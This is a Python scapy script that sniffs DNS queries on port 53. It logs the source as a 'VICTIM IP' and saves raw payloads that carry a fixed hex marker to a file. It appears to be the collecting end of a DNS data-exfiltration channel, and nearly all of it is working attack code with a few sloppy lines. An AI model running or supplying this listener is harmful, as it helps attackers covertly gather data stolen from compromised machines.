#!/usr/bin/env python3

from scapy.all import *
from datetime import datetime
import time
import datetime
import sys

interface = 'eth0'
filter_bpf = "dst port 53"

# ------ SELECT/FILTER MSGS


def select_DNS(pkt):
    pkt_time = pkt.sprintf('%sent.time%')
# ------ SELECT/FILTER DNS MSGS
    try:
        if DNSQR in pkt:
            # queries
            print('[**] Detected DNS QR Message at: ' + pkt_time)
            data = str(pkt.show([Raw]))
            dataS = str(data)
            dataT = str(pkt[Raw].load)
            f = open('dns_req.txt', "a")
            f.write("\n\n\n" + "VICTIM IP :" + str(pkt.getlayer(IP).src))
            if dataS.find("'73a94e9217810f490cff289694d0e538.'") > 0:
                f.write("\n<----------------------- PACKET :" +
                        pkt_time + " --------------------------->\n")
                for i in dataT:
                    dataReq = str(i)
                    f.write(dataReq)
                f.write("\n\n\n" + "INFO IP :" + str(pkt.getlayer(IP).src))
            else:
                pass

# f.close()
           #
        elif DNSRR in pkt:
            # responses
            print('[**] Detected DNS RR Message at: ' + pkt_time)
            pkt.show([Raw])
  #
    except:
        pass


# ------ START SNIFFER
paquets = sniff(filter=filter_bpf, iface=interface,  prn=select_DNS)